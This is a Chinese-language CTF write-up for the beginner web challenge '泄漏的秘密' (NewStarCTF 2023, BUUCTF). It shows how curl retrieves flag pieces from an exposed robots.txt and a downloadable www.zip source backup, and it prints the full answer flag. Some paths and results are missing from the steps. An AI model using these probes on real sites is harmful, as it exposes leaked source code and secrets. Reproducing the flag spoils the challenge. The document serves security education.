---
title: "[NewStarCTF 2023 公开赛道]泄漏的秘密"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [info-leak, robots-txt, source-code-backup]
vulnerability: 信息泄露（robots.txt + www.zip 源码备份）
solved: true
flag: "flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}"
---

# [NewStarCTF 2023 公开赛道]泄漏的秘密

## 题目概述
页面提示"粗心的管理员泄漏了一些敏感信息"，需要找到两个泄露的敏感信息拼成完整 flag。

## 信息收集
1. 访问题目，页面显示提示信息
2. 访问  发现第一段 flag：
3. 下载  源码备份，解压后  中有第二段：

## 漏洞分析
两个典型信息泄露点：
1. **robots.txt 泄露** — 管理员在 robots.txt 中意外写入了 flag 片段
2. **源码备份泄露** — www.zip 可直接下载，包含 index.php 源码

## 利用过程
```bash
# 获取第一段 flag
curl -s http://TARGET/robots.txt
# PART ONE: flag{r0bots_1s_s0_us3ful

# 下载源码备份获取第二段
curl -s http://TARGET/www.zip -o www.zip && unzip www.zip && cat index.php
# $PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
```

拼接得到：

## 复现步骤
```bash
curl -s http://TARGET/robots.txt
curl -s http://TARGET/www.zip -o www.zip && unzip www.zip && cat index.php
```
